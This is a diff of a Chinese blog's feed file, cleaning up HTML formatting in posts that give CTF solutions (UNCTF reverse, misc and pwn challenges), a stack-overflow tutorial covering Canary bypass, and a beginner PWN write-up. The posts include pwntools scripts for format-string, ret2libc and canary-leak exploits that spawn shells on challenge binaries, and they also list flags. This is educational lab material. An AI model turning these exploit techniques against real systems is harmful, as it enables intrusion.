-    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>key<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">=</span><span class="token string">""</span> v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"a2[i];"</span> v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"a2[i+1];"</span> v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"a2[i+2];"</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"(v5[i]^key)-6;"</span> a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"(v4[i+1]^key)+6;"</span> a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"v3[i+2]^key^6;"</span> <span class="token punctuation">}</span><span class="token operator">=</span><span class="token string">""</span> cout<span class="token operator">&lt;&lt;</span>a1<span class="token punctuation">;</span><span class="token operator">=</span><span class="token string">""</span> <span class="token operator">&lt;=</span><span class="token string">""</span> code<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>key<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iostream<span class="token operator">></span></code></pre><code class="c">
-<p><img src="https://ae01.alicdn.com/kf/Hfc2b5deb6260419db18bf6bee9ab746cJ.png" alt=""></p>
+    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>key<span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>a2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v5<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">;</span>
+        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>v4<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">;</span>
+        a1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span>v3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">^</span>key<span class="token operator">^</span><span class="token number">6</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    cout<span class="token operator">&lt;&lt;</span>a1<span class="token punctuation">;</span>
+ <span class="token punctuation">}</span> </code></pre>
+<p><img src="https://ae01.alicdn.com/kf/Hfc2b5deb6260419db18bf6bee9ab746cJ.png" alt></p>
 <p>得到flag:unctf{b66_6b6_66b}</p>
 <h3 id="unctf-easy-Maze"><a href="#unctf-easy-Maze" class="headerlink" title="unctf_easy_Maze"></a>unctf_easy_Maze</h3><p>从名字中就可以推测出是迷宫题 下载附件 拖进IDA</p>
-<p><img src="https://ae01.alicdn.com/kf/H527c4d5522d14ffb99fff951ccf981b1j.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H527c4d5522d14ffb99fff951ccf981b1j.png" alt></p>
 <p>v9数组明显是最初始在定义数组 原本是一个个的变量 通过手动修正可以让IDA识别成为数组 步入Step0和Step1两个函数 发现是分别对原本的迷宫进行变换 而Step2函数则是接受输入 进入走迷宫的环节 在尝试下写逆算法后选择放弃 决定使用动态调试 在Step2函数前下断 找到变换完成后的迷宫即可 </p>
 <blockquote>
 </blockquote>
@@ -1990,13 +2168,17 @@ using namespace std<span class="token punctuation">;</span>
     <span class="token punctuation">{</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">7</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
-            cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token operator">=</span><span class="token string">""</span> cout<span class="token operator">&lt;&lt;</span>mazz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">=</span><span class="token string">""</span> <span class="token punctuation">}</span><span class="token operator">&lt;=</span><span class="token string">""</span> code<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>endl<span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iostream<span class="token operator">></span></code></pre><code class="c">
-<p><img src="https://ae01.alicdn.com/kf/H16a308588307444e99589e8d835d5845l.png" alt=""></p>
+            cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        cout<span class="token operator">&lt;&lt;</span>mazz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>    
+<span class="token punctuation">}</span></code></pre>
+<p><img src="https://ae01.alicdn.com/kf/H16a308588307444e99589e8d835d5845l.png" alt></p>
 <p>对照迷宫从(0,0)走到(6,6)即可 </p>
-<p><img src="https://ae01.alicdn.com/kf/Ha6b282e91d8346fb9ffb4d6744471271Z.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Ha6b282e91d8346fb9ffb4d6744471271Z.png" alt></p>
 <p>得到flag:UNCTF{ssddwdwdddssaasasaaassddddwdds}</p>
 <h3 id="easyvm"><a href="#easyvm" class="headerlink" title="easyvm"></a>easyvm</h3><p>这题应该我是非预期解… 没有进行算法逆向和动态调试 直接使用Python中的Angr库进行符号执行 得到flag</p>
-<p><img src="https://ae01.alicdn.com/kf/H5dddc8800dcb4418b5c19e68e57f0217H.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H5dddc8800dcb4418b5c19e68e57f0217H.png" alt></p>
 <p>贴出脚本</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> angr
 
@@ -2006,15 +2188,15 @@ simgr<span class="token operator">=</span>project<span class="token punctuation"
 simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x400BDA</span><span class="token punctuation">,</span>avoid<span class="token operator">=</span><span class="token number">0x400B96</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
 <h3 id="奇怪的数组"><a href="#奇怪的数组" class="headerlink" title="奇怪的数组"></a>奇怪的数组</h3><p>载入IDA 通过阅读主函数 知道flag的格式为flag{****}</p>
-<p><img src="https://ae01.alicdn.com/kf/H0010bde43e734b52988cc085af9b232eI.png" alt=""></p>
-<p>步入char2hex函数查看算法 发现首先是限制输入只能为 <strong>‘0’<del>‘9’&amp;&amp;’a’</del>‘e’</strong> 发现后面的减法运算其实就是将字符转为数值 0~15 返回到主函数 发现在关键if判断前有一个 <strong>v9=16*v11+v10</strong> 确定是十六进制运算 <em>简单举例就是A*16+D=AD</em><br>然后将得数和程序预先设计好的checkbox数组进行比较 可以得知 程序需要的输入其实就是checkbox数组的值 </p>
-<p><img src="https://ae01.alicdn.com/kf/H579884a3afc84b6b9ca56c6e424a3cd2E.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H0010bde43e734b52988cc085af9b232eI.png" alt></p>
+<p>步入char2hex函数查看算法 发现首先是限制输入只能为 <strong>‘0’<del>‘9’&&’a’</del>‘e’</strong> 发现后面的减法运算其实就是将字符转为数值 0~15 返回到主函数 发现在关键if判断前有一个 <strong>v9=16*v11+v10</strong> 确定是十六进制运算 <em>简单举例就是A*16+D=AD</em><br>然后将得数和程序预先设计好的checkbox数组进行比较 可以得知 程序需要的输入其实就是checkbox数组的值 </p>
+<p><img src="https://ae01.alicdn.com/kf/H579884a3afc84b6b9ca56c6e424a3cd2E.png" alt></p>
 <p>得到flag:flag{ad461e203c7975b35e527960cbfeb06c}</p>
 <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h3><p>玩就完事了= =</p>
 <h3 id="信号不好我先挂了"><a href="#信号不好我先挂了" class="headerlink" title="信号不好我先挂了"></a>信号不好我先挂了</h3><p>下载附件 载入Stegsolve发现存在图片隐写 且隐写数据为504B0304开头 怀疑是压缩包 直接保存成ZIP </p>
-<p><img src="https://ae01.alicdn.com/kf/H98899544adbe44dfa49cc7f2f25d6efcR.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H98899544adbe44dfa49cc7f2f25d6efcR.png" alt></p>
 <p>得到一个长得和原图一模一样的图片 使用十六进制编辑器和Stegsolve都没有发现线索 在百度过后怀疑是隐水印 使用工具BlindWaterMark尝试破解 得到flag</p>
-<p><img src="https://ae01.alicdn.com/kf/Hbdacf6fb10b94692b0042ab46eae90b6j.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hbdacf6fb10b94692b0042ab46eae90b6j.png" alt></p>
 <h3 id="Think"><a href="#Think" class="headerlink" title="Think"></a>Think</h3><p>下载附件 发现是个Python脚本 运行后输出一句</p>
 <blockquote>
 </blockquote>
@@ -2024,23 +2206,23 @@ simgr<span class="token punctuation">.</span>explore<span class="token punctuati
 <p>猜测可能直接就是2019unctf 粗略阅读下代码 发现后面有base64decode 怀疑是经过base64加密后的”2019unctf” 加密后尝试 得到flag</p>
 <p>flag:flag{34a94868a8ad9ff82baadb326c513d40}</p>
 <h3 id="亲爱的"><a href="#亲爱的" class="headerlink" title="亲爱的"></a>亲爱的</h3><p>这真的不是社工题么… 下载后发现是mp3 音频分析后没有线索 尝试使用16进制编辑器查看 发现文件最后存有一个压缩包 </p>
-<p><img src="https://ae01.alicdn.com/kf/H3957789159424e6892be90a5e079cf93O.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H3957789159424e6892be90a5e079cf93O.png" alt></p>
 <p>直接修改后缀 发现压缩包需要密码  尝试爆破无果 发现压缩包备注 “qmusic 2019.7.27 17:47” 在QQ音乐上的同歌曲下的评论区寻找对应评论 得到密码 “真的上头” 解压出来一张图片 拖入十六进制编辑器 发现存在压缩包</p>
-<p><img src="https://ae01.alicdn.com/kf/H99778f2de6394b0b975fdca9696afc871.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H99778f2de6394b0b975fdca9696afc871.png" alt></p>
 <p>直接修改后缀 在压缩包 /Word/media/ 路径下发现flag图片</p>
-<p><img src="https://ae01.alicdn.com/kf/Hb41cabac09d74679a4b9f43f79d07c8fP.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hb41cabac09d74679a4b9f43f79d07c8fP.png" alt></p>
 <p>得到falg:UNCTF{W3_L0v3_Unctf}</p>
 <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyfmt"><a href="#babyfmt" class="headerlink" title="babyfmt"></a>babyfmt</h3><blockquote>
 <p>存在漏洞:格式化字符串漏洞</p>
 </blockquote>
 <p>照例 下载先查保护</p>
-<p><img src="https://ae01.alicdn.com/kf/Hfcf3459d32234459bd9038bcdf09e3d6l.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hfcf3459d32234459bd9038bcdf09e3d6l.png" alt></p>
 <p>发现保护全关 载入IDA 发现存在格式化字符串漏洞 且输入长度不足以溢出返回地址</p>
-<p><img src="https://ae01.alicdn.com/kf/He66d3dd1538c43ce965aa031d0f91118b.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/He66d3dd1538c43ce965aa031d0f91118b.png" alt></p>
 <p>那么肯定是通过写入shellcode 来实现getshell 先去找一个空白的bss段地址</p>
-<p><img src="https://ae01.alicdn.com/kf/H9561966502154d29a2a15780b7e4b423A.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H9561966502154d29a2a15780b7e4b423A.png" alt></p>
 <p>发现bss段地址是 0x8049b80开始的 载入IDA查看是否有读写执行权限</p>
-<p><img src="https://ae01.alicdn.com/kf/Heaab253259f0480dbd38315db946809c9.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Heaab253259f0480dbd38315db946809c9.png" alt></p>
 <p>存在读写执行权限 那么接下来就是通过格式化字符串漏洞将shellcode 写入bss段地址 然后利用漏洞修改返回地址为bss段地址即可</p>
 <blockquote>
 <p>这里介绍一下pwntools 针对格式化字符串漏洞的模块 fmtstr_payload</p>
@@ -2093,11 +2275,11 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 </blockquote>
 <p>其实做下来 感觉这道题才是PWN模块的签到题…</p>
 <p>其实题目已经提示 用到的知识是ROP 当然 下载附件后起码的尊敬还是要的</p>
-<p><img src="https://ae01.alicdn.com/kf/Hbfd015f0da7241359c15efc52abdca27h.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hbfd015f0da7241359c15efc52abdca27h.png" alt></p>
 <p>然后载入IDA 发现第一个限制条件 要求v2的值是0x66666666 然后通过寄存器发现v2是存在栈上的 而且buf是可以溢出覆盖到的 那我们直接覆盖即可</p>
-<p><img src="https://ae01.alicdn.com/kf/H3c110809807e4b1f9e8ada15e9586729D.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H3c110809807e4b1f9e8ada15e9586729D.png" alt></p>
 <p>接下来跟进 sub_804853D 发现溢出点buf 通过观察栈图确定buf可以溢出到返回地址 但是问题是 这里的限制条件是返回地址不能是大于0x8050000的地址 对于执行所有Libc中的函数来说基本都是不可能的 所以我们考虑绕过方式</p>
-<p><img src="https://ae01.alicdn.com/kf/H50a0b71b04ff42638c5cbad83611bed9W.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H50a0b71b04ff42638c5cbad83611bed9W.png" alt></p>
 <p>通过观察函数表我们发现puts函数的地址是小于0x8050000的 所以我们通过puts函数来泄漏Libc版本 然后返回主函数进行二次利用 在第二次利用的时候 我们将puts函数的返回地址改为system即可</p>
 <p>直接给出脚本</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -2136,9 +2318,9 @@ sh<span class="token punctuation">.</span>sendline<span class="token punctuation
 
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
-<p><img src="https://ae01.alicdn.com/kf/H40e854236162467fadefc95cc93de3ede.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H40e854236162467fadefc95cc93de3ede.png" alt></p>
 <p>得到shell </p>
-</code></code><script>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -2156,7 +2338,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -2176,11 +2358,11 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <entry>
       <title><![CDATA[栈溢出漏洞及利用]]></title>
       <url>/2019/10/11/zhan-yi-chu/</url>
-      <content type="html"><![CDATA[<h2 id="简述漏洞形成"><a href="#简述漏洞形成" class="headerlink" title="简述漏洞形成"></a>简述漏洞形成</h2><blockquote>
+      <content type="html"><![CDATA[<html><head></head><body><h2 id="简述漏洞形成"><a href="#简述漏洞形成" class="headerlink" title="简述漏洞形成"></a>简述漏洞形成</h2><blockquote>
 <p>想要了解栈溢出漏洞是怎么形成的首先要先了解下在汇编层面的函数调用和栈相关的知识</p>
 <p>栈的生长方向是向低地址生长 也就是压栈时数据是先放到高地址的地方<br>这里栈的概念是和数据结构中的栈一致的 即一种<strong>FILO</strong>(first in last out)的数据结构</p>
 <p>而在汇编层面上 函数调用时会进行保存现场操作 即保存函数调用前寄存器的状态 通常在进入函数体时 栈内就已经有数据了 通常的排布如下</p>
-<p><img src="https://ae01.alicdn.com/kf/H38d1f8f92100468f9a51b205dea97fcak.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H38d1f8f92100468f9a51b205dea97fcak.png" alt></p>
 <p>这里参数是从左向右入栈还是从右向左入栈取决于调用方法 在这里我们不做讨论 EBP保存的是在函数调用前栈底的位置 <em>当栈清空时栈顶自然回位所以不必保存栈顶指针</em> 返回地址则保存的是当函数调用完毕后<strong>需要执行</strong>的指令地址 在函数调用结束的时候 栈的情况就是按相反方向出栈<br>即 先弹出局部变量 然后弹出EBP到EBP寄存器中 最后弹出返回地址到EIP寄存器中 而参数则是直接使用<strong>ADD ESP</strong>让他们直接消失在栈中</p>
 </blockquote>
 <p>在大致了解了下汇编层面的函数调用和栈知识 我们就可以来了解栈溢出漏洞是怎么造成的了..栈溢出漏洞即字面意思 就是向栈中写入了超过限定长度的数据 导致溢出的数据覆盖栈中其他数据 从而影响程序的运行</p>
@@ -2220,7 +2402,7 @@ int main(void)
 {
       hello();
       return 0;
-}</stdlib.h></stdio.h></code></pre>
+}</code></pre>
 <p>在乌班图上使用GCC编译 首先我们关闭所有的保护 这里我是将程序编译成32位 64位同理</p>
 <blockquote>
 <p>NX：-z execstack / -z noexecstack (关闭/开启) 栈执行</p>
@@ -2228,14 +2410,14 @@ int main(void)
 <p>PIE：-no-pie / -pie (关闭/开启) 地址随机化</p>
 <p>RELRO：-z norelro / -z lazy / -z now (关闭/部分开启/完全开启) 对GOT表具有写权限</p>
 </blockquote>
-<p>使用checksec 查看程序保护<br><img src="https://ae01.alicdn.com/kf/H4e535c2f20cf4afa80cadf6a4e66137ac.png" alt=""></p>
+<p>使用checksec 查看程序保护<br><img src="https://ae01.alicdn.com/kf/H4e535c2f20cf4afa80cadf6a4e66137ac.png" alt></p>
 <p><em>这里我忘记关闭RELRO保护了</em></p>
 <p>打开IDA 反编译一下 发现所有函数都正常读入</p>
-<p><img src="https://ae01.alicdn.com/kf/Hed74694200524a87b334d09a04ad627dK.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hed74694200524a87b334d09a04ad627dK.png" alt></p>
 <p>阅读源码 发现在hello()函数中存在敏感函数gets() 确定溢出点 在IDA中双击s查看栈图</p>
-<p><img src="https://ae01.alicdn.com/kf/H21f396218fab4b79b76116dc1145db58r.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H21f396218fab4b79b76116dc1145db58r.png" alt></p>
 <p>栈图如下 可以发现 变量s的初始地址到返回地址的偏移是 6C+4=70个字节 那我们的基本思路就是 向程序中填入70个无用字节 然后将返回地址覆盖成函数pwn()的地址 这样我们就可以拿到终端</p>
-<p><img src="https://ae01.alicdn.com/kf/Hf4f1fafc469b47f4959eee1d90db3989H.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/Hf4f1fafc469b47f4959eee1d90db3989H.png" alt></p>
 <p>那么使用pwntools库进行脚本的编写 </p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
@@ -2244,7 +2426,7 @@ payload<span class="token operator">=</span><span class="token string">"1"</span
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>执行脚本 得到终端</p>
-<p><img src="https://ae01.alicdn.com/kf/H8a387bd208744392bc1b83f5d63151234.png" alt=""></p>
+<p><img src="https://ae01.alicdn.com/kf/H8a387bd208744392bc1b83f5d63151234.png" alt></p>
 <p>在没有保护的情况下 利用完毕</p>
 <h2 id="在有Canary保护的情况下的利用"><a href="#在有Canary保护的情况下的利用" class="headerlink" title="在有Canary保护的情况下的利用"></a>在有Canary保护的情况下的利用</h2><p>绕过Canary保护的的方法主要有两种分别都有各自的局限性 </p>
 <p>第一种就是利用程序的格式化字符串漏洞泄漏出指定位置的Canary值 当然 这种方法的前提就是程序中存在格式化字符串漏洞… </p>
@@ -2272,12 +2454,12 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 <p>利用格式化字符串的第一步就是需要测出内存中存储的字符串相对于参数的偏移</p>
 <p><img src="https://s2.ax1x.com/2019/10/18/KeEsiV.png" alt="KeEsiV.png"></p>
 <p>这里可以测出 在我本机的偏移是6 那么将程序载入IDA(或者动态调试 都能达到相同的目的) 可以通过汇编面板看到 Var_c就是Canary值 那么转到主函数的栈图 可以明确看到 输入的参数距离Var_c的距离是 <strong>70-c=0x64</strong> 那么输入的参数距离Canary的参数个数就为 <strong>100(0x64)/4+6=31</strong> 明确我们利用格式化子串的格式化输入为 <strong>%31$p</strong></p>
-<p><img src="http://p1.so.qhimgs1.com/t0121dda714c5a6d361.jpg" alt=""></p>
-<p><img src="http://p1.so.qhimgs1.com/t01e714c15cedb1cee0.jpg" alt=""></p>
+<p><img src="http://p1.so.qhimgs1.com/t0121dda714c5a6d361.jpg" alt></p>
+<p><img src="http://p1.so.qhimgs1.com/t01e714c15cedb1cee0.jpg" alt></p>
 <p>那下一步就是写脚本了</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
@@ -2318,7 +2500,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>stdio<span class="token punctuation">.</span>h<span class="token operator">></span></code></pre>
+<span class="token punctuation">}</span></code></pre>
 <p>这个就没有那么多将就 直接载入IDA 看距离 覆盖到Canary值即可</p>
 <p>脚本如下</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>
@@ -2360,7 +2542,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             });
             document.body.appendChild(img);
           });
-      </script>]]></content>
+      </script></body></html>]]></content>
       
         <categories>
             
@@ -2380,18 +2562,18 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
     <entry>
       <title><![CDATA[攻防世界PWN新手练习区WP]]></title>
       <url>/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/</url>
-      <content type="html"><![CDATA[<a id="more"></a>
+      <content type="html"><![CDATA[<html><head></head><body><a id="more"></a>
 <blockquote>
 <p>近期笨逼菜鸡开始接触PWN 刷了刷攻防世界的题目 在这里记录下自己的学习成果</p>
 </blockquote>
-<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信息<br>发现无壳 但是存在Canary保护和NX保护<br><img src="https://img-blog.csdnimg.cn/20190928183818798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=""></p>
+<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信息<br>发现无壳 但是存在Canary保护和NX保护<br><img src="https://img-blog.csdnimg.cn/20190928183818798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt></p>
 <blockquote>
-<p>这里先讲一下什么是Canary保护<br>Canary保护主要是用来防护栈溢出的 在开启Canary保护程序调用函数的时候 会在栈中压入一个随机Canary值 在函数结束的时候程序会判断Canary值是否发生变动 如果发生变动就认为是程序遭到了攻击 程序直接异常退出 Canary值通常和函数返回地址在栈中相连 主要是防护攻击者更改程序返回地址来执行shellcode<br>这里我们直接拿本题做例子<br><img src="https://img-blog.csdnimg.cn/20190928185413790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="">可以明确看到程序现在在存储Canary值 我们在数据下硬件读写断点 然后让程序跑起来<br><img src="https://img-blog.csdnimg.cn/20190928185721986.png" alt="">这里在函数末尾取出Canary值 如果与刚开始的值不一致 执行stack_chk_fail函数<br>对于如何绕过Canary保护 基本思路是利用各种漏洞 先泄漏出来Canary的地址 然后取出值 等溢出过后再还原 当然具体如何利用还得就题论题</p>
+<p>这里先讲一下什么是Canary保护<br>Canary保护主要是用来防护栈溢出的 在开启Canary保护程序调用函数的时候 会在栈中压入一个随机Canary值 在函数结束的时候程序会判断Canary值是否发生变动 如果发生变动就认为是程序遭到了攻击 程序直接异常退出 Canary值通常和函数返回地址在栈中相连 主要是防护攻击者更改程序返回地址来执行shellcode<br>这里我们直接拿本题做例子<br><img src="https://img-blog.csdnimg.cn/20190928185413790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt>可以明确看到程序现在在存储Canary值 我们在数据下硬件读写断点 然后让程序跑起来<br><img src="https://img-blog.csdnimg.cn/20190928185721986.png" alt>这里在函数末尾取出Canary值 如果与刚开始的值不一致 执行stack_chk_fail函数<br>对于如何绕过Canary保护 基本思路是利用各种漏洞 先泄漏出来Canary的地址 然后取出值 等溢出过后再还原 当然具体如何利用还得就题论题</p>
 </blockquote>
 <blockquote>
 <p>同时也讲一下NX保护吧 NX保护一般是不可绕过的 他是禁止了栈执行 也就是即使你写入了shellcode 但是如果NX保护开启的话 也是不能在栈上执行的</p>
 </blockquote>
-<p>回到本题 先随便执行下 就是输入用户名和留言 然后程序原样打印出来<br><img src="https://img-blog.csdnimg.cn/20190928190438694.png" alt=""><br>没什么世纪大发现 那就常规操作 载入IDA吧<br><img src="https://img-blog.csdnimg.cn/20190928190601948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt=""><br>发现程序存在格式化字符串漏洞 然后理解下程序逻辑 简单来说就是将pwnme变量的值更改为8就能拿到flag了 双击pwnme看一下 发现pwnme变量还是一个在bss段的全局变量 那基本思路已经有了<br><img src="https://img-blog.csdnimg.cn/20190928190855410.png" alt=""><br>解法基本就是通过格式化字符串漏洞更改pwnme的值了 那第一步就是测试程序的回显位了 这里我的回显位是在第十位<br><img src="https://img-blog.csdnimg.cn/20190928191119916.png" alt=""><br>那基本信息获取的差不多了 就可以开始编写脚本了</p>
